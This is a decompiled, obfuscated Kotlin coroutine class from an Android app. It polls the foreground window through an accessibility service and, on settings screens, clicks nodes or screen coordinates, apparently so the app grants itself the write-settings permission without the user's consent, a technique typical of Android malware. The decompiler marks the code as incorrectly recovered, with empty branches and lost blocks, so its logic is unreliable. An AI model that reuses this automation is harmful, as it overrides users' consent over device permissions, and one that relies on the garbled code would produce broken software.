package com.storm.safe.rock.service.modules;

import android.view.accessibility.AccessibilityNodeInfo;
import kotlin.coroutines.intrinsics.CoroutineSingletons;
import kotlin.coroutines.jvm.internal.SuspendLambda;
import kotlinx.coroutines.AbstractC0780a0;
import p000.C1351vv;
import p000.InterfaceC0876mv;
import p000.InterfaceC0920no;
import p000.InterfaceC1116qn;
import p000.b81;
import p000.kg1;
import p000.l10;
import p000.t60;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
@InterfaceC1116qn(m214402c = "com.storm.safe.rock.service.modules.WriteSettingsPermissionManager$startPeriodicDetection$1", m214403f = "WriteSettingsPermissionManager.kt", m214404l = {359, 380, 399, 406, 414, 414}, m214405m = "invokeSuspend")
/* loaded from: classes2.dex */
final class WriteSettingsPermissionManager$startPeriodicDetection$1 extends SuspendLambda implements l10 {

    /* renamed from: a1 */
    public int f52996a1;

    /* renamed from: a2 */
    public int f52997a2;

    /* renamed from: a3 */
    public int f52998a3;

    /* renamed from: a4 */
    public /* synthetic */ Object f52999a4;

    /* renamed from: a5 */
    public final /* synthetic */ C0327b2 f53000a5;

    /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
    public WriteSettingsPermissionManager$startPeriodicDetection$1(C0327b2 c0327b2, InterfaceC0876mv interfaceC0876mv) {
        super(2, interfaceC0876mv);
        this.f53000a5 = c0327b2;
    }

    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    public final InterfaceC0876mv create(Object obj, InterfaceC0876mv interfaceC0876mv) {
        WriteSettingsPermissionManager$startPeriodicDetection$1 writeSettingsPermissionManager$startPeriodicDetection$1 = new WriteSettingsPermissionManager$startPeriodicDetection$1(this.f53000a5, interfaceC0876mv);
        writeSettingsPermissionManager$startPeriodicDetection$1.f52999a4 = obj;
        return writeSettingsPermissionManager$startPeriodicDetection$1;
    }

    @Override // p000.l10
    public final Object invoke(Object obj, Object obj2) {
        return ((WriteSettingsPermissionManager$startPeriodicDetection$1) create((InterfaceC0920no) obj, (InterfaceC0876mv) obj2)).invokeSuspend(C1351vv.f60710b1);
    }

    /* JADX WARN: Code restructure failed: missing block: B:72:0x0165, code lost:
    
        if (p000.b81.m210571b1(1000, r13) == r1) goto L89;
     */
    /* JADX WARN: Code restructure failed: missing block: B:96:0x0063, code lost:
    
        com.storm.safe.rock.service.modules.C0327b2.m211711f4(r8);
     */
    /* JADX WARN: Path cross not found for [B:53:0x0101, B:50:0x00e8], limit reached: 88 */
    /* JADX WARN: Removed duplicated region for block: B:21:0x0069  */
    /* JADX WARN: Removed duplicated region for block: B:29:0x0090  */
    /* JADX WARN: Removed duplicated region for block: B:69:0x014c A[Catch: Exception -> 0x00af, TRY_ENTER, TRY_LEAVE, TryCatch #0 {Exception -> 0x00af, blocks: (B:30:0x0097, B:33:0x00a2, B:35:0x00a8, B:41:0x00b7, B:43:0x00c1, B:45:0x00d1, B:69:0x014c, B:48:0x00da, B:50:0x00e8, B:53:0x0101, B:55:0x0107, B:57:0x010d, B:58:0x0112, B:60:0x0121, B:61:0x0126, B:63:0x012e, B:44:0x00c9), top: B:92:0x0097 }] */
    /* JADX WARN: Removed duplicated region for block: B:75:0x016a  */
    /* JADX WARN: Removed duplicated region for block: B:79:0x017a  */
    /* JADX WARN: Removed duplicated region for block: B:82:0x0183  */
    /* JADX WARN: Removed duplicated region for block: B:87:0x019a  */
    /* JADX WARN: Removed duplicated region for block: B:90:0x01a8  */
    /* JADX WARN: Removed duplicated region for block: B:92:0x0097 A[EXC_TOP_SPLITTER, SYNTHETIC] */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:32:0x00a1 -> B:19:0x0063). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:51:0x00fd -> B:19:0x0063). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:57:0x010d -> B:19:0x0063). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:60:0x0121 -> B:19:0x0063). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:72:0x0165 -> B:16:0x0047). Please report as a decompilation issue!!! */
    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object invokeSuspend(Object obj) throws Throwable {
        int i;
        int iOrdinal;
        InterfaceC0920no interfaceC0920no;
        InterfaceC0920no interfaceC0920no2;
        String string;
        AccessibilityNodeInfo accessibilityNodeInfoM211727c1;
        C1351vv c1351vv = C1351vv.f60710b1;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i2 = this.f52998a3;
        try {
        } catch (Exception e) {
            e = e;
            t60.m214705c6("WriteSettingsPerm", "❌ 定时检测失败", e);
            this.f52999a4 = interfaceC0920no;
            this.f52996a1 = i;
            this.f52997a2 = i2;
            this.f52998a3 = 4;
        }
        switch (i2) {
            case 0:
                kg1.m213544f4(obj);
                interfaceC0920no2 = (InterfaceC0920no) this.f52999a4;
                i = 0;
                i2 = 15;
                if (this.f53000a5.f53169a3 || !AbstractC0780a0.m213691a2(interfaceC0920no2.mo210226a1()) || i >= i2) {
                    if (i >= i2 && this.f53000a5.f53169a3) {
                        iOrdinal = this.f53000a5.f53176b0.ordinal();
                        if (iOrdinal != 0) {
                            C0327b2 c0327b2 = this.f53000a5;
                            this.f52999a4 = null;
                            this.f52998a3 = 5;
                            obj = c0327b2.m211714a3(this);
                            if (obj != coroutineSingletons) {
                                if (((Boolean) obj).booleanValue()) {
                                    C0327b2 c0327b22 = this.f53000a5;
                                    int i3 = C0327b2.f53165c0;
                                    c0327b22.m211740e5("坐标点击策略超时");
                                } else {
                                    C0327b2 c0327b23 = this.f53000a5;
                                    this.f52998a3 = 6;
                                    int i4 = C0327b2.f53165c0;
                                    if (c0327b23.m211755g2(10, 1000L, this) == coroutineSingletons) {
                                    }
                                }
                            }
                        } else if (iOrdinal == 1) {
                            this.f53000a5.m211742e7();
                        }
                    }
                    return c1351vv;
                }
                this.f52999a4 = interfaceC0920no2;
                this.f52996a1 = i;
                this.f52997a2 = i2;
                this.f52998a3 = 1;
                if (b81.m210571b1(800L, this) != coroutineSingletons) {
                    i++;
                    if (!this.f53000a5.m211734d5()) {
                        this.f53000a5.m211741e6();
                        if (i >= i2) {
                            iOrdinal = this.f53000a5.f53176b0.ordinal();
                            if (iOrdinal != 0) {
                            }
                        }
                        return c1351vv;
                    }
                    try {
                    } catch (Exception e2) {
                        interfaceC0920no = interfaceC0920no2;
                        e = e2;
                        t60.m214705c6("WriteSettingsPerm", "❌ 定时检测失败", e);
                        this.f52999a4 = interfaceC0920no;
                        this.f52996a1 = i;
                        this.f52997a2 = i2;
                        this.f52998a3 = 4;
                        break;
                    }
                    AccessibilityNodeInfo rootInActiveWindow = this.f53000a5.f53166a0.getRootInActiveWindow();
                    if (rootInActiveWindow != null) {
                        CharSequence packageName = rootInActiveWindow.getPackageName();
                        if (packageName == null || (string = packageName.toString()) == null) {
                            string = "";
                        }
                        if (string.equals(this.f53000a5.f53174a8)) {
                            this.f53000a5.f53175a9++;
                        } else {
                            this.f53000a5.f53175a9 = 1;
                            this.f53000a5.f53174a8 = string;
                        }
                        if (this.f53000a5.f53175a9 >= 1 || i >= 3) {
                            if (string.equals(this.f53000a5.f53167a1.getPackageName())) {
                                C0327b2.m211711f4(rootInActiveWindow);
                                this.f53000a5.m211743e8();
                                this.f52999a4 = interfaceC0920no2;
                                this.f52996a1 = i;
                                this.f52997a2 = i2;
                                this.f52998a3 = 2;
                                if (b81.m210571b1(1000L, this) == coroutineSingletons) {
                                }
                            } else if (C0327b2.m211708e0(string) || C0327b2.m211707d8(string)) {
                                this.f53000a5.f53181b5.add(rootInActiveWindow);
                                if (this.f53000a5.m211736d7() && (accessibilityNodeInfoM211727c1 = this.f53000a5.m211727c1(rootInActiveWindow)) != null) {
                                    C0327b2 c0327b24 = this.f53000a5;
                                    c0327b24.m211746f1(accessibilityNodeInfoM211727c1);
                                    this.f52999a4 = interfaceC0920no2;
                                    this.f52996a1 = i;
                                    this.f52997a2 = i2;
                                    this.f52998a3 = 3;
                                    Object objM211755g2 = c0327b24.m211755g2(10, 1000L, this);
                                    if (objM211755g2 != coroutineSingletons) {
                                        interfaceC0920no = interfaceC0920no2;
                                        obj = objM211755g2;
                                        ((Boolean) obj).booleanValue();
                                        return c1351vv;
                                    }
                                } else {
                                    C0327b2.m211711f4(rootInActiveWindow);
                                }
                            } else {
                                C0327b2.m211711f4(rootInActiveWindow);
                            }
                        }
                    }
                    if (this.f53000a5.f53169a3) {
                    }
                    if (i >= i2) {
                    }
                    return c1351vv;
                }
                return coroutineSingletons;
            case 1:
                i2 = this.f52997a2;
                i = this.f52996a1;
                InterfaceC0920no interfaceC0920no3 = (InterfaceC0920no) this.f52999a4;
                kg1.m213544f4(obj);
                interfaceC0920no2 = interfaceC0920no3;
                i++;
                if (!this.f53000a5.m211734d5()) {
                }
                break;
            case 2:
                i2 = this.f52997a2;
                i = this.f52996a1;
                interfaceC0920no = (InterfaceC0920no) this.f52999a4;
                kg1.m213544f4(obj);
                interfaceC0920no2 = interfaceC0920no;
                if (this.f53000a5.f53169a3) {
                }
                if (i >= i2) {
                }
                return c1351vv;
            case 3:
                i2 = this.f52997a2;
                i = this.f52996a1;
                interfaceC0920no = (InterfaceC0920no) this.f52999a4;
                kg1.m213544f4(obj);
                ((Boolean) obj).booleanValue();
                return c1351vv;
            case 4:
                i2 = this.f52997a2;
                i = this.f52996a1;
                interfaceC0920no = (InterfaceC0920no) this.f52999a4;
                kg1.m213544f4(obj);
                interfaceC0920no2 = interfaceC0920no;
                if (this.f53000a5.f53169a3) {
                }
                if (i >= i2) {
                }
                return c1351vv;
            case 5:
                kg1.m213544f4(obj);
                if (((Boolean) obj).booleanValue()) {
                }
                return c1351vv;
            case 6:
                kg1.m213544f4(obj);
                return c1351vv;
            default:
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
        }
    }
}
